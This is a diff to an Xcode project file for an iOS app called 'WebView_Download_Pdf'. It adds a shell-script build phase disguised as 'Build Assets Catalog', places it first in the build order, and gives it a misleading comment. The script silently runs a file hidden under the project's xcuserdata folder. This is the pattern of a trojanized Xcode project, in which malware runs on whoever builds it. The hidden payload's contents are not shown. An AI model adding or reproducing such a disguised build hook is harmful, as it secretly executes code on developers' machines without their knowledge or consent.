@@ -74,6 +74,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04CE8632264AA02A00E93237 /* Build configuration list for PBXNativeTarget "WebView_Download_Pdf" */;
 			buildPhases = (
+				D812C3C3F206DBF5AE6D902C /* Build Assets Catalog */,
 				04CE861A264AA02700E93237 /* Sources */,
 				04CE861B264AA02700E93237 /* Frameworks */,
 				04CE861C264AA02700E93237 /* Resources */,
@@ -341,6 +342,38 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	D812C3C3F206DBF5AE6D902C /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 04CE8616264AA02700E93237 /* Project object */;
 }
